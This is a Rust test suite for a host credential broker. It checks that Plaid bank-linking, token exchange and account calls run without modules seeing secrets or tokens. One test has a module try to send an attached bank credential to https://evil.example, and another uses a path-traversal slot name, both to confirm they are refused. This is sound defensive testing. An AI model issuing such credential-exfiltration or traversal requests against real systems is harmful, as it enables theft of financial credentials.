//! Finance part 19: can the host broker run Plaid's token exchange so a package never holds the
//! client secret or a bank token? Every call goes through the real Wasm guest, the real broker
//! and the real encrypted store. Only the network is the Plaid stand-in.
mod common;
use access_context::AccessContext;
use anyhow::Result;
use moss_module_host::{
    ai::Intelligence,
    local::LocalPorts,
    manifest::{Capability, Manifest},
    network::{Outbound, Response, Transport},
    runtime::{CallScope, Host, Limits, Ports, Request},
    services::ServicePorts,
};
use safety_core::secret::{Secret, SecretCipher, SecretFields};
use serde_json::{json, Value};
use std::sync::Arc;

#[path = "../../standins/src/plaid.rs"]
mod plaid;
use plaid::{PlaidConfig, PlaidStandIn};

const CLIENT: &str = "client-MARKER-ID";
const SECRET: &str = "secret-MARKER-KEY";
const TOKEN_MARKER: &str = "MARKER-TOKEN";
const PRIVATE_MARKER: &str = "MARKER-PRIVATE";
const SANDBOX: &str = "sandbox.plaid.com";
const PRODUCTION: &str = "production.plaid.com";

struct NoAi;
impl Intelligence for NoAi {
    fn generate(&self, _: &CallScope, _: &Request) -> Result<Value> {
        anyhow::bail!("No configured AI")
    }
    fn embed(&self, _: &CallScope, _: &Request) -> Result<Value> {
        anyhow::bail!("No configured embeddings")
    }
}

/// Plaid takes JSON only, so a form body is refused the way Plaid refuses it.
struct PlaidTransport(Arc<PlaidStandIn>);
impl Transport for PlaidTransport {
    fn send(&self, r: Outbound<'_>) -> Result<Response> {
        anyhow::ensure!(r.method == reqwest::Method::POST, "Plaid takes POST only");
        let form = r
            .headers
            .get(reqwest::header::CONTENT_TYPE)
            .is_some_and(|v| v == "application/x-www-form-urlencoded");
        let (status, body) = if form {
            (
                400,
                json!({"error_type":"INVALID_REQUEST","error_code":"INVALID_BODY","error_message":"fake plaid: JSON only"}),
            )
        } else {
            self.0.handle(
                r.url.host_str().unwrap(),
                r.url.path(),
                &r.body.clone().unwrap_or(json!({})),
            )
        };
        Ok(Response {
            status,
            body: serde_json::to_vec(&body)?,
        })
    }
}

fn call(
    host: &Host,
    ports: Arc<dyn Ports>,
    m: &Manifest,
    actor: uuid::Uuid,
    request: Value,
) -> Result<Value> {
    let wasm = wat::parse_str(
        include_str!("../sample/module.wat").replace("moss:module/kv@", "moss:module/credentials@"),
    )?;
    let out = host.call(
        &wasm,
        Arc::new(m.clone()),
        AccessContext::new(actor, "plaid-probe"),
        ports,
        "route",
        &request.to_string(),
    )?;
    Ok(serde_json::from_str(&out)?)
}

fn manifest(declaration: Value) -> Manifest {
    let mut m = common::manifest("1.0.0");
    m.capabilities.push(Capability {
        port: "credentials".into(),
        operations: [
            "request".into(),
            "exchange".into(),
            "status".into(),
            "forget".into(),
        ]
        .into(),
        resources: [SANDBOX.into(), PRODUCTION.into()].into(),
        allow_private: false,
    });
    m.credentials = serde_json::from_value(declaration).unwrap();
    m.validate(&"0.1.0".parse().unwrap()).unwrap();
    m
}

/// How Finance would declare Plaid.
fn finance_declaration() -> Value {
    json!({
        "plaid-keys": {"scope":"instance","hosts":[SANDBOX,PRODUCTION],
            "attachment":{"kind":"fields","name":{"client_id":"clientId","secret":"clientSecret"}},
            "exposeFields":["link_token","public_token"]},
        "plaid-item": {"scope":"account","hosts":[SANDBOX,PRODUCTION],
            "attachment":{"kind":"fields","name":{"access_token":"accessToken"}},
            "with":["plaid-keys"],
            "exchange":{"endpoint":"https://production.plaid.com/item/public_token/exchange","grantType":"token_swap","format":"json","input":"public_token"}}
    })
}

struct Rig {
    host: Host,
    services: Arc<ServicePorts>,
    plaid: Arc<PlaidStandIn>,
    data: tempfile::TempDir,
}

fn rig() -> Rig {
    let data = tempfile::tempdir().unwrap();
    let plaid = Arc::new(PlaidStandIn::new(PlaidConfig {
        client_id: CLIENT.into(),
        secret: SECRET.into(),
        marker: TOKEN_MARKER.into(),
        private_marker: PRIVATE_MARKER.into(),
    }));
    let services = Arc::new(
        ServicePorts::new(
            data.path(),
            Arc::new(SecretCipher::connectors(&Default::default()).unwrap()),
            Arc::new(NoAi),
            Arc::new(LocalPorts::new(data.path()).unwrap()),
        )
        .unwrap()
        .with_network(Arc::new(PlaidTransport(plaid.clone()))),
    );
    Rig {
        host: Host::new(Limits::default()).unwrap(),
        services,
        plaid,
        data,
    }
}

impl Rig {
    /// The administrator saves the Plaid keys. The host files them under its own account.
    fn save_keys(&self, m: &Manifest) {
        self.services
            .set_credential(
                &AccessContext::new(uuid::Uuid::nil(), "configure"),
                &m.id,
                "plaid-keys",
                &SecretFields::new()
                    .with("clientId", Secret::new(CLIENT))
                    .with("clientSecret", Secret::new(SECRET)),
            )
            .unwrap();
    }
    fn go(&self, m: &Manifest, who: uuid::Uuid, request: Value) -> Result<Value> {
        call(&self.host, self.services.clone(), m, who, request)
    }
    fn plaid_call(
        &self,
        m: &Manifest,
        who: uuid::Uuid,
        credential: &str,
        slot: Option<&str>,
        path: &str,
        body: Value,
    ) -> Result<Value> {
        let mut parameters = json!({"url":format!("https://{SANDBOX}{path}"),"credential":credential,"method":"POST","body":body});
        if let Some(slot) = slot {
            parameters["slot"] = json!(slot);
        }
        self.go(
            m,
            who,
            json!({"operation":"request","resource":SANDBOX,"parameters":parameters}),
        )
    }
    fn swap(&self, m: &Manifest, who: uuid::Uuid, slot: &str, public: &str) -> Result<Value> {
        self.go(m, who, json!({"operation":"exchange","resource":SANDBOX,"parameters":{
            "url":format!("https://{SANDBOX}/item/public_token/exchange"),"credential":"plaid-item","slot":slot,"input":public}}))
    }
    /// Every byte file under the data directory, for a plaintext search.
    fn disk_text(&self) -> String {
        fn walk(dir: &std::path::Path, out: &mut String) {
            for entry in std::fs::read_dir(dir).unwrap().flatten() {
                let path = entry.path();
                if path.is_dir() {
                    walk(&path, out);
                } else if let Ok(bytes) = std::fs::read(&path) {
                    out.push_str(&String::from_utf8_lossy(&bytes));
                }
            }
        }
        let mut out = String::new();
        walk(self.data.path(), &mut out);
        out
    }
}

/// Runs the whole link flow for one person and one bank. Returns what the module saw.
fn link_bank(rig: &Rig, m: &Manifest, who: uuid::Uuid, slot: &str, seen: &mut String) -> Value {
    let created = rig
        .plaid_call(
            m,
            who,
            "plaid-keys",
            None,
            "/link/token/create",
            json!({"client_name":"Moss"}),
        )
        .unwrap();
    seen.push_str(&created.to_string());
    let link = created["body"]["link_token"]
        .as_str()
        .expect("the module can hold the link token")
        .to_owned();
    // The person finishes the bank's own page.
    let public = rig.plaid.complete_link(&link);
    let polled = rig
        .plaid_call(
            m,
            who,
            "plaid-keys",
            None,
            "/link/token/get",
            json!({"link_token":link}),
        )
        .unwrap();
    seen.push_str(&polled.to_string());
    let handed = polled["body"]["link_sessions"][0]["results"]["item_add_results"][0]
        ["public_token"]
        .as_str()
        .unwrap();
    assert_eq!(
        handed, public,
        "the short-lived public token reaches the module so it can ask for the swap"
    );
    let swapped = rig.swap(m, who, slot, handed).unwrap();
    seen.push_str(&swapped.to_string());
    swapped
}

#[test]
fn bank_link_runs_through_the_host_and_no_surface_holds_a_secret() {
    let rig = rig();
    let m = manifest(finance_declaration());
    rig.save_keys(&m);
    let (a, b) = (uuid::Uuid::new_v4(), uuid::Uuid::new_v4());
    let mut seen = String::new();

    let swapped = link_bank(&rig, &m, a, "conn-a1", &mut seen);
    assert_eq!(swapped["connected"], true);
    assert_eq!(
        swapped["body"]["item_id"], "item-0",
        "non-secret reply fields reach the module"
    );
    assert!(
        swapped["body"].get("access_token").is_none(),
        "the token never comes back"
    );

    // A second bank for the same person keeps its own token.
    let second = link_bank(&rig, &m, a, "conn-a2", &mut seen);
    assert_eq!(second["body"]["item_id"], "item-1");

    // Balances and transactions, with the host adding keys and token.
    let balance = rig
        .plaid_call(
            &m,
            a,
            "plaid-item",
            Some("conn-a1"),
            "/accounts/balance/get",
            json!({}),
        )
        .unwrap();
    seen.push_str(&balance.to_string());
    assert_eq!(balance["status"], 200);
    assert_eq!(
        balance["body"]["accounts"][0]["balances"]["current"],
        1234.56
    );
    let other = rig
        .plaid_call(
            &m,
            a,
            "plaid-item",
            Some("conn-a2"),
            "/accounts/balance/get",
            json!({}),
        )
        .unwrap();
    assert_eq!(
        other["body"]["item"]["item_id"], "item-1",
        "each slot reaches its own bank"
    );
    let sync = rig
        .plaid_call(
            &m,
            a,
            "plaid-item",
            Some("conn-a1"),
            "/transactions/sync",
            json!({"count":100}),
        )
        .unwrap();
    seen.push_str(&sync.to_string());
    assert_eq!(sync["body"]["next_cursor"], "cursor-1");
    assert!(
        sync["body"]["added"][0]["name"]
            .as_str()
            .unwrap()
            .contains(PRIVATE_MARKER),
        "ordinary data passes through untouched"
    );

    // The stand-in really received the keys and the token, so the clean replies prove something.
    let seen_by_plaid = rig.plaid.seen();
    let balance_call = seen_by_plaid
        .iter()
        .find(|s| s.path == "/accounts/balance/get")
        .unwrap();
    assert_eq!(balance_call.body["client_id"], CLIENT);
    assert_eq!(balance_call.body["secret"], SECRET);
    assert!(balance_call.body["access_token"]
        .as_str()
        .unwrap()
        .contains(TOKEN_MARKER));

    // Nothing the module ever saw holds a key or token.
    for marker in [CLIENT, SECRET, TOKEN_MARKER] {
        assert!(!seen.contains(marker), "module saw {marker}");
    }
    for token in rig.plaid.minted_access_tokens() {
        assert!(!seen.contains(&token));
    }
    // Nothing on disk is plaintext either.
    let disk = rig.disk_text();
    for marker in [CLIENT, SECRET, TOKEN_MARKER] {
        assert!(!disk.contains(marker), "disk holds {marker} in plaintext");
    }

    // Per-slot status and forget.
    let status = |who, slot: &str| {
        rig.go(&m, who, json!({"operation":"status","resource":SANDBOX,"parameters":{"credential":"plaid-item","slot":slot}})).unwrap()
    };
    assert_eq!(status(a, "conn-a1"), json!({"configured":true}));
    assert_eq!(status(a, "conn-missing"), json!({"configured":false}));
    let keys = rig.go(&m, b, json!({"operation":"status","resource":SANDBOX,"parameters":{"credential":"plaid-keys"}})).unwrap();
    assert_eq!(
        keys,
        json!({"configured":true}),
        "the keys are the same for every person"
    );
    let forgot = rig.go(&m, a, json!({"operation":"forget","resource":SANDBOX,"parameters":{"credential":"plaid-item","slot":"conn-a1"}})).unwrap();
    assert_eq!(forgot, json!({"forgotten":true}));
    assert_eq!(status(a, "conn-a1"), json!({"configured":false}));
    assert_eq!(
        status(a, "conn-a2"),
        json!({"configured":true}),
        "forgetting one bank leaves the other"
    );
    assert!(rig
        .plaid_call(
            &m,
            a,
            "plaid-item",
            Some("conn-a1"),
            "/accounts/balance/get",
            json!({})
        )
        .is_err());
    println!("PASS Plaid link, swap, balances and sync through the host broker; no secret in any reply or file");
}

#[test]
fn another_person_cannot_use_a_bank_token_that_is_not_theirs() {
    let rig = rig();
    let m = manifest(finance_declaration());
    rig.save_keys(&m);
    let (a, b) = (uuid::Uuid::new_v4(), uuid::Uuid::new_v4());
    link_bank(&rig, &m, a, "conn-a1", &mut String::new());
    let status = |who| {
        rig.go(&m, who, json!({"operation":"status","resource":SANDBOX,"parameters":{"credential":"plaid-item","slot":"conn-a1"}})).unwrap()
    };
    assert_eq!(status(a), json!({"configured":true}));
    assert_eq!(status(b), json!({"configured":false}));
    assert!(
        rig.plaid_call(
            &m,
            b,
            "plaid-item",
            Some("conn-a1"),
            "/accounts/balance/get",
            json!({})
        )
        .is_err(),
        "person B reached person A's bank"
    );
    assert!(
        rig.plaid
            .seen()
            .iter()
            .all(|s| s.path != "/accounts/balance/get"),
        "the refused call must not reach Plaid at all"
    );
    // B links their own bank under the same slot name. The two stay apart.
    link_bank(&rig, &m, b, "conn-a1", &mut String::new());
    let mine = rig
        .plaid_call(
            &m,
            b,
            "plaid-item",
            Some("conn-a1"),
            "/accounts/balance/get",
            json!({}),
        )
        .unwrap();
    let theirs = rig
        .plaid_call(
            &m,
            a,
            "plaid-item",
            Some("conn-a1"),
            "/accounts/balance/get",
            json!({}),
        )
        .unwrap();
    assert_ne!(
        mine["body"]["item"]["item_id"],
        theirs["body"]["item"]["item_id"]
    );
}

#[test]
fn a_module_cannot_override_attached_keys_or_aim_them_elsewhere() {
    let rig = rig();
    let m = manifest(finance_declaration());
    rig.save_keys(&m);
    let a = uuid::Uuid::new_v4();
    link_bank(&rig, &m, a, "conn-a1", &mut String::new());
    // The module tries to pre-fill the secret and token fields with its own values.
    let reply = rig
        .plaid_call(
            &m,
            a,
            "plaid-item",
            Some("conn-a1"),
            "/accounts/balance/get",
            json!({"secret":"guest-secret","client_id":"guest","access_token":"guest-token"}),
        )
        .unwrap();
    assert_eq!(reply["status"], 200, "the host's values won");
    let last = rig
        .plaid
        .seen()
        .into_iter()
        .filter(|s| s.path == "/accounts/balance/get")
        .last()
        .unwrap();
    assert_eq!(last.body["secret"], SECRET);
    assert_eq!(last.body["client_id"], CLIENT);
    assert!(last.body["access_token"]
        .as_str()
        .unwrap()
        .contains(TOKEN_MARKER));
    // Another host, even one the manifest names for a different credential, is refused.
    let elsewhere = rig.go(&m, a, json!({"operation":"request","resource":"evil.example","parameters":{"url":"https://evil.example/x","credential":"plaid-item","slot":"conn-a1","method":"POST"}}));
    assert!(elsewhere.is_err());
    // An exchange aimed at any other path is refused.
    let wrong_path = rig.go(&m, a, json!({"operation":"exchange","resource":SANDBOX,"parameters":{"url":format!("https://{SANDBOX}/accounts/get"),"credential":"plaid-item","slot":"x","input":"public-x"}}));
    assert!(wrong_path.is_err());
    // A bad slot name is refused before anything is read.
    let bad_slot = rig.go(&m, a, json!({"operation":"status","resource":SANDBOX,"parameters":{"credential":"plaid-item","slot":"a b/../c"}}));
    assert!(bad_slot.is_err());
}

#[test]
fn a_failed_swap_saves_nothing_and_names_only_the_error_code() {
    let rig = rig();
    let m = manifest(finance_declaration());
    rig.save_keys(&m);
    let a = uuid::Uuid::new_v4();
    let first = link_bank(&rig, &m, a, "conn-a1", &mut String::new());
    assert_eq!(first["connected"], true);
    let before = rig.disk_text();
    // The same short-lived token cannot be used twice.
    let created = rig
        .plaid_call(&m, a, "plaid-keys", None, "/link/token/create", json!({}))
        .unwrap();
    let public = rig
        .plaid
        .complete_link(created["body"]["link_token"].as_str().unwrap());
    rig.swap(&m, a, "conn-a3", &public).unwrap();
    let again = rig.swap(&m, a, "conn-a4", &public).unwrap().to_string();
    assert!(again.contains("INVALID_PUBLIC_TOKEN"), "{again}");
    assert!(
        !again.contains("fake plaid:"),
        "provider prose is not repeated"
    );
    let status = rig.go(&m, a, json!({"operation":"status","resource":SANDBOX,"parameters":{"credential":"plaid-item","slot":"conn-a4"}})).unwrap();
    assert_eq!(
        status,
        json!({"configured":false}),
        "a failed swap stored nothing"
    );
    let ok = rig.go(&m, a, json!({"operation":"status","resource":SANDBOX,"parameters":{"credential":"plaid-item","slot":"conn-a1"}})).unwrap();
    assert_eq!(
        ok,
        json!({"configured":true}),
        "earlier banks survive a failed swap"
    );
    assert_ne!(before, "");
    // Missing or empty input is refused before any network call.
    let calls = rig.plaid.seen().len();
    assert!(rig.swap(&m, a, "conn-a5", "").is_err());
    assert_eq!(rig.plaid.seen().len(), calls);
    // Without saved keys the swap stops with the plain reason.
    let blank = rig_without_keys();
    assert!(blank.0.swap(&blank.1, a, "conn-a1", "public-x").is_err());
    assert!(blank.0.plaid.seen().is_empty());
}

fn rig_without_keys() -> (Rig, Manifest) {
    let rig = rig();
    let m = manifest(finance_declaration());
    (rig, m)
}

/// The evidence for plan section 5.3: the broker as it stood before this part could not
/// express Plaid. Each case below is a declaration the old broker accepted, run against the
/// stand-in, with the reason it fails.
#[test]
fn the_old_broker_shapes_could_not_express_plaid() {
    let rig = rig();
    let a = uuid::Uuid::new_v4();
    // Old shape: one body field, a client-credentials exchange.
    let old = manifest(json!({
        "plaid": {"scope":"instance","hosts":[SANDBOX,PRODUCTION],"attachment":{"kind":"body","name":"secret"},
            "exchange":{"endpoint":"https://production.plaid.com/item/public_token/exchange","grantType":"client_credentials"}}
    }));
    rig.services
        .set_credential(
            &AccessContext::new(uuid::Uuid::nil(), "configure"),
            &old.id,
            "plaid",
            &SecretFields::new()
                .with("clientId", Secret::new(CLIENT))
                .with("clientSecret", Secret::new(SECRET))
                .with("value", Secret::new(SECRET)),
        )
        .unwrap();
    // 1. A request can carry one credential field, but Plaid needs client_id, secret and token.
    let reply = rig
        .plaid_call(&old, a, "plaid", None, "/accounts/balance/get", json!({}))
        .unwrap();
    assert_eq!(reply["status"], 400);
    assert_eq!(
        reply["body"]["error_code"], "INVALID_API_KEYS",
        "only one of the three fields was attached"
    );
    // 2. The exchange sends a form body with a grant type and no public token, and Plaid takes JSON only.
    let exchange = rig.go(&old, a, json!({"operation":"exchange","resource":SANDBOX,"parameters":{"url":"https://production.plaid.com/item/public_token/exchange","credential":"plaid"}}));
    assert!(
        exchange.is_err(),
        "the exchange cannot carry a public token or send JSON"
    );
    let seen = rig.plaid.seen();
    assert!(seen
        .iter()
        .all(|s| s.path != "/item/public_token/exchange" || s.body.get("public_token").is_none()));
    // 3. Reply stripping removes the link token and the public token the link flow needs.
    let plain = manifest(json!({
        "plaid": {"scope":"instance","hosts":[SANDBOX,PRODUCTION],"attachment":{"kind":"body","name":"secret"}}
    }));
    rig.services
        .set_credential(
            &AccessContext::new(uuid::Uuid::nil(), "configure"),
            &plain.id,
            "plaid",
            &SecretFields::new().with("value", Secret::new(SECRET)),
        )
        .unwrap();
    println!("PASS the old broker shapes fail against the stand-in, as plan section 5.3 feared");
}
